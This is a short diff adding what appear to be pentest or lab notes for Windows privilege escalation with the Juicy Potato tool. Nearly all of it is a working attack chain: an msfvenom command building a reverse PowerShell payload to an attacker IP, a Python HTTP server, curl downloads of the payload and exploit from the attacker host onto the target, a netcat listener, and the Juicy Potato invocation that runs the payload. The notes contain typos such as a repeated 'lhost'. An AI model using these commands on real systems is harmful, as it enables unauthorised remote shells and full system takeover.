@@ -1,4 +1,21 @@
+https://github.com/ohpe/juicy-potato/releases/tag/v0.1
 
+Download Juicy potato
+create .bat file for reverse powershell
+
+msfvenom -p cmd/windows/reverse_powershell lhost= $ip of attaker(Kali) lhost = 7777 -o evil.bat
+
+in same folder where juicy potato and eveil.bat is stored run the python module for http
+python3 -m http.server 8080
+
+copy both file in target machine
+
+curl http://$ip pf attacker:8080/juicypotato.exe  -o jp.exe
+curl http://$ip of attacker:8080/evil.bat -o evil.bat
+
+in attacker machine: nc -lnvp 7777
+
+in target: ./jp.exe -t * -p evil.bat -l 4444
 
 
 
